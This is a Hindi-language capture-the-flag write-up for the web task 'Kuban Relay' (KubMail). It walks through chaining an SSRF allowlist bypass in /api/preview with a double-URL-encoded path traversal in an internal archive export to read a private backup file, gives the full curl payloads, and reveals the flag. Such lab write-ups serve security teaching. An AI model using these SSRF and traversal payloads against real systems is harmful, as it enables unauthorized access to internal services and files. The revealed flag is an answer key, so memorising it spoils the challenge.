# Kuban Relay

> **श्रेणी:** Web · **इवेंट:** KubSTU CTF 2026 Autumn
> Write-up: KubMail — वह आर्काइव जो सब कुछ याद रखता है

## 📌 कार्य

KubMail एक इंटीग्रेशन मेल/आर्काइव सर्विस है। फ़्लैग तक सार्वजनिक पेजों से पहुँचना है: कोई एकल "जादुई" अनुरोध नहीं है — एक निजी बैकअप फ़ाइल पढ़ने के लिए `/api/preview` एंडपॉइंट में मौजूद SSRF को आंतरिक archive gateway में डबल-URL-डिकोडिंग वाले path traversal के साथ जोड़ा जाता है।

**फ़ाइलें:** [KubMail_CTF (1).zip](../../../assets/Web/Kuban%20Relay/KubMail_CTF%20%281%29.zip)

## 🏁 समाधान

### 1. समाधान की शृंखला

यह कार्य एक अनुरोध से नहीं, बल्कि एक शृंखला से हल होता है:

```text
публичная страница
  → /api/docs
  → /api/preview (SSRF)
  → /internal/health
  → /internal/debug/routes
  → ticket tram-7-archive
  → /internal/archive/export
  → двойное URL-декодирование
  → path traversal
  → flag
```

### 2. टोह (Reconnaissance)

मुख्य पेज पर एक **API-दस्तावेज़ीकरण** लिंक है। अनुरोध:

```bash
curl http://127.0.0.1:5000/api/docs
```

लौटाता है:

```json
{
  "name": "KubMail integration API",
  "version": "2.3",
  "endpoints": {
    "preview": "/api/preview?url=<URL>",
    "route": "/api/route?from=&to="
  },
  "preview_note": "Preview accepts approved kubmail.local integration URLs."
}
```

दस्तावेज़ में सोर्स कोड उजागर किए बिना एक संकेत भी मौजूद है:

```json
"legacy_monitoring": {
  "health_probe": "/internal/health",
  "purpose": "archive gateway availability check"
}
```

इससे कार्य blackbox-तरीके से हल करने योग्य हो जाता है: health probe रूट को अनुमान लगाने या ब्रूट-फ़ोर्स से ढूँढने की ज़रूरत नहीं। `/api/preview` एंडपॉइंट दिलचस्प है: सर्वर स्वयं उपयोगकर्ता द्वारा दिए गए URL पर एक HTTP-अनुरोध करता है। यह SSRF का संकेत है।

### 3. allowlist का बायपास

एप्लिकेशन में जाँच इस तरह लिखी गई है:

```python
if 'kubmail.local' not in target:
    return jsonify({'error':'destination is not on the approved integration network'}), 403
```

यह hostname नहीं, बल्कि पूरी URL स्ट्रिंग जाँचता है। इसलिए `kubmail.local` को URL के query-पैरामीटर में रखा जा सकता है, जबकि असली गंतव्य localhost ही रहे:

```text
http://127.0.0.1:5000/internal/health?via=kubmail.local
```

proxy को बाहरी अनुरोध:

```bash
curl --get 'http://127.0.0.1:5000/api/preview' \
  --data-urlencode 'url=http://127.0.0.1:5000/internal/health?via=kubmail.local'
```

प्रतिक्रिया:

```json
{
  "body": "{\"build\":\"2024.03.17\",\"note\":\"legacy export requires a gateway ticket\",\"routes\":\"/internal/debug/routes\",\"service\":\"krd-archive-gateway\",\"status\":\"ok\"}\n",
  "status": 200
}
```

### 4. debug एंडपॉइंट तक पहुँच

प्रतिक्रिया से हमें पथ `/internal/debug/routes` ज्ञात है। हम उसे उसी SSRF के ज़रिए निष्पादित करते हैं:

```bash
curl --get 'http://127.0.0.1:5000/api/preview' \
  --data-urlencode 'url=http://127.0.0.1:5000/internal/debug/routes?via=kubmail.local'
```

प्रतिक्रिया में आंतरिक रूट और ticket है:

```json
{
  "export": {
    "method": "GET",
    "parameter": "name",
    "ticket": "tram-7-archive"
  },
  "routes": [
    "/internal/health",
    "/internal/debug/routes",
    "/internal/archive/export"
  ]
}
```

यह भी दिखता है कि आंतरिक endpoints `X-Kubmail-Proxy` हेडर पर भरोसा करते हैं, जिसे SSRF-प्रॉक्सी अपने आप जोड़ देता है।

### 5. archive export का विश्लेषण

`/internal/archive/export` एंडपॉइंट को एक ticket और एक `name` पैरामीटर चाहिए:

```python
if request.args.get('ticket') != 'tram-7-archive':
    return jsonify({'error':'invalid gateway ticket'}),401

raw = request.args.get('name','')
name = unquote(raw)
target = (PUBLIC_DIR / name).resolve()
```

यहाँ अतिरिक्त डिकोडिंग वाली वही गलती दोहराई जाती है। सामान्य `/download` के विपरीत, आंतरिक export यह जाँच नहीं करता कि परिणामी पथ `data/public` के भीतर ही रहा।

### 6. अंतिम traversal

हमें `data/public` से निकलकर `data/private` में जाना है और यह अनुरोध करना है:

```text
data/private/krd_weather_backup.txt
```

इसके लिए हम यह नाम भेजते हैं:

```text
%252e%252e%252fprivate%252fkrd_weather_backup.txt
```

बाहरी proxy की allowlist पार करने के लिए आंतरिक endpoint को एक साथ `ticket`, `name` और `kubmail.local` मार्कर मिलने चाहिए। सबसे सुविधाजनक तरीका है नेस्टेड URL के भीतर के ऐम्परसैंड्स को URL-एन्कोड करना:

```text
http://127.0.0.1:5000/internal/archive/export?ticket=tram-7-archive%26name=%252e%252e%252fprivate%252fkrd_weather_backup.txt%26via=kubmail.local
```

पूरी कमांड:

```bash
curl --get 'http://127.0.0.1:5000/api/preview' \
  --data-urlencode 'url=http://127.0.0.1:5000/internal/archive/export?ticket=tram-7-archive%26name=%252e%252e%252fprivate%252fkrd_weather_backup.txt%26via=kubmail.local'
```

query-पैरामीटरों के डिकोड होने के बाद आंतरिक अनुरोध इस तरह बनता है:

```text
/internal/archive/export?ticket=tram-7-archive&name=%2e%2e%2fprivate%2fkrd_weather_backup.txt&via=kubmail.local
```

Flask पहले स्तर पर `%25` डिकोड करता है, और archive gateway में `unquote()` दूसरा चरण करके नाम को इसमें बदल देता है:

```text
../private/krd_weather_backup.txt
```

पथ-नॉर्मलाइज़ेशन देता है:

```text
data/public/../private/krd_weather_backup.txt
→ data/private/krd_weather_backup.txt
```

### 7. फ़्लैग

प्रतिक्रिया में मिलता है:

```text
KubSTU{kuban_legacy_gateway_reads_between_the_lines}
```

**फ्लैग:** `KubSTU{kuban_legacy_gateway_reads_between_the_lines}`
